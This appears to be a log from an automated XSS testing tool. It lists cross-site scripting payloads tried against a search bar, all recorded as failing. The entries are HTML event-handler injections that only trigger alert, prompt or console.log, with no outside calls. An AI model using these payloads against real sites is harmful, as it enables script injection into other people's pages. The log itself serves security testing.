# Failed XSS Payloads - 2025-07-22 19:26:22.503961
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
# Failed XSS Payloads - 2025-07-22 19:48:03.287492
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onchange=console.log("XSS")> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
# Failed XSS Payloads - 2025-07-22 19:48:52.521424
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onchange=console.log("XSS")> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onkeydown=eval("alert(1)")<!--eval("alert(1)")"> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
# Failed XSS Payloads - 2025-07-22 19:49:35.851894
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<marquee onchange=console.log("XSS")> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
<textarea onkeydown=eval("alert(1)")<!--eval("alert(1)")"> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
